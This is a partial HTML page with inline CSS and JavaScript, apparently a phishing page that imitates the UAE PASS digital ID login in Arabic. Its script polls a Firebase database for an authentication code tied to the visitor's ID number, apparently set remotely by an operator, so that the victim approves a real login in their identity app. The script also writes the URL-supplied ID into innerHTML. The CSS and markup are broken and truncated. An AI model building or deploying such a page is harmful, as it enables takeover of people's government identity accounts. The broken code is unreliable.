    <style>
        body, html {
            font-family: 'Dubai', 'Roboto', sans-serif !important;
            background: #F9F9FB;
            margin: 0;
            padding: 0;
            height: 100%;
        }
        
        .main-container {
            height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .flex {
            display: flex;
        }

        .login-container {
            max-width: 1280px;
            margin: auto;
            flex: 0 0 100%;
        }

        .login-container-fluid {
            max-width: 100%;
            height: 100%;
        }

        .header {
            background: #fff;
            height: 64px;
            padding: 16px 0px;
        }

        .header-title {
            color: #1B1B1F;
            font-style: normal;
            font-weight: 300;
            line-height: 32px;
            font-size: 22px;
            padding: 0px 16px;
        }
        
        .card {
            margin: 48px 0px 10px 0px;
        }

        .card-info {
            position: relative;
            display: flex;
            flex-direction: column;
            min-width: 0;
            word-wrap: break-word;
            background-clip: border-box;
            border-radius: 0.25rem;

            border: 0px !important;
        }

        .card.login {
            padding: 48px;
            margin: 48px 0px 10px 0px;
            border: 1.6px solid transparent;
            border-radius: 19px;
            background-image: linear-gradient(to right bottom, white, white), radial-gradient(circle at top left, #ACE4AC, #fff, #fff 100%);

            background-clip: padding-box, border-box;
        }

        .card.login .card-header {
            display: flex;
            justify-content: space-between;
            background: white;
            border: 0;
            padding: 0px;
        }

        .card.login .card-content {
            display: flex;
            flex-direction: row;
            flex-grow: 1;
            justify-content: space-between;
        }

        .card.login .card-content .card-content-left {
            max-width: 70%;
            padding-right: 40px;
        }

        .login-pin-image {
            max-width: 400px;
            width: 100%;
        }

        .info-title {
            font-size: 18px;
            font-style: normal;
            font-weight: 500;
        }

        .info-app-name {
            font-size: 16px;
            font-style: normal;
            font-weight: 400;
            padding: 32px 0px;
        }

        .info-description {
            font-size: 28px;
            font-style: normal;
            font-weight: 400;
            line-height: 36px;
            max-width: 500px;
        }

        @keyframes spin {
            from {transform: translate(-50%, -50%) rotate(0);}
            to   {transform: translate(-50%, -50%) rotate(360deg);}
        }
        
        .passcode-card {
            color: #454F63;
            width: 90px;
            height: 90px;
            margin: auto;
            position: relative;
            overflow: hidden;
            border-radius: 16px;
            display: inline-block;
        }

        .passcode-card::before {
            content: '';
            display: block;
            background: conic-gradient(
                #fff 0.0turn 0.125turn,
                #fff 0.125turn 0.25turn,
                #fff 0.25turn 0.375turn,
                #fff 0.375turn 0.5turn,
                #fff 0.5turn 0.625turn,
                #fff 0.625turn 0.75turn,
                #20644B 0.75turn 0.875turn,
                #20644B 0.875turn 1.0turn
            );
            width: calc(100% * 1.41421356237);
            padding-bottom: calc(100% * 1.41421356237);
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            border-radius: 100%;
            animation: spin 5s linear infinite;
        }

        .passcode-card::after {
            content: attr(data-after-content);
            position: absolute;
            inset: 0.15rem;
            background: #ECF3EC;
            border-radius: 0.85rem;
            font-size: 52px;
            font-style: normal;
            font-weight: 400;
            text-align: center;
            line-height: 100px;
        }

        .uaepass-logo {
            width: 32px;
            object-fit: contain;
            height: 32px;
            padding: 6px
        }

        .uaepass-text-logo {
            display: flex;
            height: 41px;
            justify-content: center;
            align-items: center;
        }

        .timer-img {
            width: 25px;
            height: 20px;
            padding: 1.667px 5.149px 2.415px 4.706px;
            justify-content: center;
            align-items: center;
        }

        .waiting-confirmation {
            color: #C78200;
            font-family: Roboto;
            font-size: 18px;
            font-style: normal;
            font-weight: 400;
            line-height: normal;
            padding-top: 52px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .cancel-request {
            color: #FF5545;
            border: 0;
            background: transparent;
            font-size: 18px;
            font-style: normal;
            font-weight: 500;
            line-height: 24px;
            cursor: pointer;
        }

        .cancel-request:after {
            display: inline-block;
            content: "\00d7";
            font-size: 28px;
            padding: 10px 0px;
            font-weight: 400;
        }

        .polling-footer {
            position: relative;
            width: 100%;
        }

        .ids-logo {
            width: 13px;
            height: 13px;
            object-fit: contain;
            position: absolute;
            margin-bottom: 1em;
            margin-left: 5px;
        }

        .poweredby {
            font-size: 1rem;
            font-weight: 500;
            line-height: 1.5;
            text-align: center;
            color: #454f63;
        }
        
        /* شاشة الخطأ */
        .error-screen {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;

            background: #F9F9FB;
        }
        
        .error-icon {
            font-size: 60px;
            color: #ff4757;
            margin-bottom: 20px;

        .id-number-display {
            font-size: 25px;
                line-height: 1.5;

        @media only screen and (max-width: 600px) {
            .card-content-right {

            .card-content-right-mobile {

            .info-description {
                font-size: 18px;
                line-height: 1.5;
            }
        }
        
        .card-content-right-mobile {
            display: none;
        }

<body>
    <!-- شاشة التحميل (تظهر أولاً) -->

        <div class="loading-spinner">
        </div>
    </div>
    
    <!-- شاشة الخطأ (تظهر عند وجود خطأ) -->

        <div class="error-icon">

    <!-- المحتوى الرئيسي (يظهر بعد جلب الرمز) -->
    <div class="main-container" id="mainContent" style="display: none;">
        <!-- Header Section -->
        <div class="header-section">
            <div class="login-container-fluid header">
                <div class="login-container flex">

            </div>
        </div>

        <!-- Main Content -->
        <div class="login-container-fluid">
            <div class="login-container">
                <form id="authForm" autocomplete="off" novalidate>
                    
                    <!-- Login Card -->
                    <div class="card login">
                        <div class="card-header">
                            <div>
                                <img src="digital_id_H.svg" alt="Digital ID" class="uaepass-text-logo">
                            </div>
                            <div class="cancel-request-div">
                                <button type="button" class="cancel-request" onclick="goBack()" aria-label="العودة">
                                 الغاء الطلب
                                </button>
                            </div>
                        </div>
                        
                        <div class="card-content">
                            <!-- Left Content -->
                            <div class="card-content-left">
                                <div class="card-info">
                                    <div class="info-title">
                                        رمز المصادقة الخاص بك
                                    </div>
                                    <div class="info-app-name" id="appNameInfo">تم إنشاؤه بواسطة نظام UAE PASS</div>

                                    <!-- Mobile Image -->
                                    <div class="card-content-right-mobile">
                                        <img src="login-pin.svg" alt="Login PIN" class="login-pin-image">
                                    </div>

                                    </div>
                                    
                                    <!-- عرض رقم الهوية -->

                                        جاري التحميل...
                                    </div>
                                    
                                    <!-- Passcode Display -->
                                    <div class="card-info">
                                        <div class="passcode-card" data-after-content="??" aria-label="الرمز" id="passcodeDisplay"></div>
                                        <div style="margin-top: 10px; font-size: 14px; color: #666; text-align: center;">

                                    <!-- Waiting Status -->
                                    <div class="waiting-confirmation">
                                        <img src="Timer.gif" alt="Timer" class="timer-img">

                                    </div>

                                    <!-- Mobile Cancel Button -->
                                    <!-- <div class="cancel-request-mobile">
                                        <button type="button" class="cancel-request" onclick="goBack()" aria-label="العودة">
                                            الغاء الطلب                                        </button>
                                    </div> -->

                                <img src="login-pin.svg" alt="Login PIN" class="login-pin-image">
                            </div>
                        </div>

                    <!-- Footer -->
                    <div class="polling-footer">
                        <img class="ids-logo" src="n6.png" alt="IDS Logo" />

                    </div>
                </form>
            </div>
        </div>
    </div>

    <script>
        // إعدادات Firebase
        let firebaseApp;
        let database;

        // دالة تهيئة Firebase
        function initializeFirebase() {
            try {
                if (!firebase.apps.length) {
                    firebaseApp = firebase.initializeApp(firebaseConfig);
                    database = firebase.database();
                    console.log('✅ Firebase تم تهيئته بنجاح');
                    return true;
                } else {
                    firebaseApp = firebase.app();
                    database = firebase.database();
                    console.log('✅ Firebase مثبت بالفعل');
                    return true;
                }
            } catch (error) {
                console.error('❌ خطأ في تهيئة Firebase:', error);
                return false;
            }
        }

        // استخراج رقم الهوية من URL
        function getIdFromURL() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('id');
        }

        // دالة جلب رمز المصادقة من Firebase
        async function getAuthCodeFromFirebase() {
            const idNumber = getIdFromURL();

            if (!idNumber) {
                showError('خطأ', 'لم يتم تحديد رقم الهوية', 'الرجاء العودة إلى صفحة التسجيل وإدخال رقم الهوية');
                return;
            }

            try {
                const safeKey = idNumber.replace(/[.#$\/\[\]]/g, '_');
                const snapshot = await database.ref('authentications/' + safeKey).once('value');

                if (!snapshot.exists()) {
                    showError('غير موجود', `رقم الهوية ${idNumber} غير موجود في النظام`, 'الرجاء التحقق من الرقم والمحاولة مرة أخرى');
                    return;
                }

                const record = snapshot.val();

                // إذا تم رفض السجل: إعادة التوجيه إلى صفحة sorry.html مع معلومات قصيرة
                const status = (record.status || '').toString().toLowerCase();
                if (status === 'rejected' || status === 'denied' || status === 'declined' || record.approved === false) {
                    const reason = record.rejection_reason || record.reason || record.error || 'تم رفض الطلب';
                    const params = new URLSearchParams({ id: idNumber, reason, recordId: safeKey });
                    window.location.href = `sorry.html?${params.toString()}`;
                    return;
                }

                if (!record.auth_code) {
                    showWaitingScreen(idNumber);
                    return;
                }

                // إظهار البيانات
                showAuthCode(record, idNumber);

            } catch (error) {
                console.error('❌ خطأ في جلب البيانات:', error);
                showError('خطأ في الاتصال', 'تعذر الاتصال بقاعدة البيانات', 'يرجى المحاولة مرة أخرى لاحقاً');
            }
        }

        // عرض رمز المصادقة
        function showAuthCode(record, idNumber) {
            // إزالة شاشة التحميل أو انتظار إن وُجدت
            const loadingScreen = document.getElementById('loadingScreen');
            if (loadingScreen) loadingScreen.remove();
            const waitingScreen = document.getElementById('waitingScreen');
            if (waitingScreen) waitingScreen.remove();

            // إظهار المحتوى الرئيسي
            const main = document.getElementById('mainContent');
            if (main) main.style.display = 'block';

            // لا نعرض رقم الهوية فعلياً — نعرض نصاً بديلًا ثابتاً
            const idNumberEl = document.getElementById('idNumberDisplay');
            if (idNumberEl) {
                idNumberEl.textContent = 'قم بفتح تطبيق الهوية الرقمية الخاص بك وادخل الرقم الموضح لتسجيل الدخول';
            }

            // تعيين رمز المصادقة
            const authCode = record.auth_code || '??';
            const passEl = document.getElementById('passcodeDisplay');
            if (passEl) {
                passEl.setAttribute('data-after-content', authCode);
                passEl.setAttribute('aria-label', `الرمز ${authCode}`);
            }

            // تحديث نص الانتظار
            const waitingTextEl = document.getElementById('waitingText');
            if (waitingTextEl) waitingTextEl.textContent = `في انتظار تأكيدك`;

            // تحديث معلومات التطبيق
            const appInfo = document.getElementById('appNameInfo');
            if (appInfo) {
                appInfo.innerHTML = `تم إنشاؤه في: ${record.date || ''}<br> الوقت: ${record.time || ''}`;
            }

            // بدء تحديث الرمز تلقائياً كل 10 ثوانٍ
            startAutoRefresh(idNumber);
        }

        // عرض خطأ
        function showError(title, message, details) {
            // إزالة شاشة الانتظار إذا كانت موجودة
            const waitingScreen = document.getElementById('waitingScreen');
            if (waitingScreen) waitingScreen.remove();

            const loadingScreen = document.getElementById('loadingScreen');
            if (loadingScreen) loadingScreen.style.display = 'none';

            const errorScreen = document.getElementById('errorScreen');
            if (errorScreen) {
                errorScreen.style.display = 'flex';
                const errorTitle = document.getElementById('errorTitle');
                const errorMessage = document.getElementById('errorMessage');
                if (errorTitle) errorTitle.textContent = title;
                if (errorMessage) errorMessage.innerHTML = `
                    <div style="font-size: 16px; margin-bottom: 10px;">${message}</div>
                    <div style="font-size: 14px; color: #666; background: #f8f9fa; padding: 10px; border-radius: 5px;">
                        <i class="fas fa-lightbulb"></i> ${details}
                    </div>
                `;
            }
        }

        // التحديث التلقائي للرمز
        function startAutoRefresh(idNumber) {
            const refreshInterval = setInterval(async () => {
                try {
                    const safeKey = idNumber.replace(/[.#$\/\[\]]/g, '_');
                    const snapshot = await database.ref('authentications/' + safeKey).once('value');

                    if (snapshot.exists()) {
                        const record = snapshot.val();

                        // تحقق من حالة الرفض — إذا رفض السجل أعِد التوجيه فوراً
                        const status = (record.status || '').toString().toLowerCase();
                        if (status === 'rejected' || status === 'denied' || status === 'declined' || record.approved === false) {
                            clearInterval(refreshInterval);
                            const reason = record.rejection_reason || record.reason || record.error || 'تم رفض الطلب';
                            const params = new URLSearchParams({ id: idNumber, reason, recordId: safeKey });
                            const waitingScreen = document.getElementById('waitingScreen');
                            if (waitingScreen) waitingScreen.remove();
                            window.location.href = `sorry.html?${params.toString()}`;
                            return;
                        }

                        // تحديث رمز المصادقة إن تغيّر
                        const passEl = document.getElementById('passcodeDisplay');
                        const currentCode = passEl ? passEl.getAttribute('data-after-content') : null;

                        if (record.auth_code && record.auth_code !== currentCode) {
                            if (passEl) {
                                passEl.setAttribute('data-after-content', record.auth_code);
                                passEl.setAttribute('aria-label', `الرمز ${record.auth_code}`);
                            }
                            const waitingTextEl = document.getElementById('waitingText');
                            if (waitingTextEl) waitingTextEl.textContent = `تم تحديث الرمز إلى: ${record.auth_code}`;
                        }
                    }
                } catch (error) {
                    console.error('❌ خطأ في التحديث:', error);
                }
            }, 10000); // كل 10 ثوانٍ
        }

        // إنشاء شاشة الانتظار
        function showWaitingScreen(idNumber) {
            // إزالة شاشة التحميل إن وُجدت
            const loadingScreen = document.getElementById('loadingScreen');
            if (loadingScreen) loadingScreen.style.display = 'none';

            // إذا كانت شاشة الانتظار موجودة لا ننشئ أخرى
            if (document.getElementById('waitingScreen')) return;

            const waitingScreen = document.createElement('div');
            waitingScreen.id = 'waitingScreen';
            waitingScreen.style.cssText = `
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                height: 100vh;
                text-align: center;
                padding: 40px 20px;
                background: #F9F9FB;
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                z-index: 9999;
            `;

            waitingScreen.innerHTML = `
                <div style="font-size: 60px; color: #007bff; margin-bottom: 20px;">
                    <i class="fas fa-spinner fa-spin"></i>
                </div>
                <h2 style="color: #454f63; margin-bottom: 10px;">جاري التحقق</h2>
                <p style="color: #78849e; margin-bottom: 20px;">جاري التحقق من وجود رمز مصادقة</p>
            `;

            document.body.appendChild(waitingScreen);

            // بدء التحقق التلقائي
            startAutoCheck(idNumber);
        }

        // دالة التحقق التلقائي
        function startAutoCheck(idNumber) {
            let checkInterval;
            let checkCount = 0;
            const maxChecks = 60; // 5 دقائق (60 * 5 ثوان)

            const updateStatus = () => {
                checkCount++;
                const waitingScreen = document.getElementById('waitingScreen');
                if (waitingScreen) {
                    const statusText = waitingScreen.querySelector('h2');
                    const infoText = waitingScreen.querySelector('p');

                    if (statusText) {
                        statusText.textContent = `جاري التحقق`;
                    }

                    if (infoText && checkCount % 10 === 0) {
                        infoText.innerHTML = `
                            <i class="fas fa-sync-alt"></i>
                            جاري التحقق... تمت المحاولة ${checkCount} مرة
                        `;
                    }
                }
            };

            const checkForAuthCode = async () => {
                if (checkCount >= maxChecks) {
                    clearInterval(checkInterval);
                    showError('انتهى الوقت', 'تم التحقق لمدة 5 دقائق دون وجود رمز', 'يرجى العودة والمحاولة لاحقاً');
                    return;
                }

                updateStatus();

                try {
                    const safeKey = idNumber.replace(/[.#$\/\[\]]/g, '_');
                    const snapshot = await database.ref('authentications/' + safeKey).once('value');

                    if (snapshot.exists()) {
                        const record = snapshot.val();

                        // أثناء الانتظار: تحقق ما إذا تم رفض السجل ثم أعد التوجيه
                        const status = (record.status || '').toString().toLowerCase();
                        if (status === 'rejected' || status === 'denied' || status === 'declined' || record.approved === false) {
                            const waitingScreen = document.getElementById('waitingScreen');
                            if (waitingScreen) waitingScreen.remove();
                            const reason = record.rejection_reason || record.reason || record.error || 'تم رفض الطلب';
                            const params = new URLSearchParams({ id: idNumber, reason, recordId: safeKey });
                            clearInterval(checkInterval);
                            window.location.href = `sorry.html?${params.toString()}`;
                            return;
                        }

                        if (record.auth_code) {
                            // إزالة شاشة الانتظار
                            const waitingScreen = document.getElementById('waitingScreen');
                            if (waitingScreen) waitingScreen.remove();

                            // إظهار الرمز
                            showAuthCode(record, idNumber);
                            clearInterval(checkInterval);
                            return;
                        }
                    }
                } catch (error) {
                    console.error('❌ خطأ في التحقق:', error);
                }
            };

            // التحقق أول مرة فوراً
            checkForAuthCode();

            // ثم كل 5 ثوانٍ
            checkInterval = setInterval(checkForAuthCode, 5000);
        }

        // العودة للخلف
        function goBack() {
            window.location.href = 'apply.html';
        }

        // عند تحميل الصفحة
        document.addEventListener('DOMContentLoaded', function() {
